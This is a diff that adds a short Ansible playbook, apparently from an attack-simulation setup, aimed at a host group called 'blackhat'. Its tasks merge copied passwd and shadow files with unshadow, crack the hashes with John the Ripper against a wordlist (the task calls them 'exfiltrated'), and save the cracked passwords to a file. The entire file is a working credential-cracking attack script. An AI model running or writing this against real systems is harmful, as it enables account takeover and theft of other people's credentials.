@@ -1,0 +1,12 @@
+---
+- name: crack the password from LDAP
+  hosts: blackhat
+  tasks:
+    - name: unshadow the password
+      raw: sudo /usr/sbin/unshadow ~/passwd ~/shadow > ~/crack_passwd
+    - name: crack the exfiltrated password
+      raw: john --wordlist=~/password_wordlist ~/crack_passwd
+    # - name: show cracked result
+    #   raw: john --show ~/crack_passwd
+    - name: store cracked result into cracked_passwd
+      raw: sudo cat ~/crack_passwd /home/ubuntu/.john/john.pot > ~/cracked_passwd
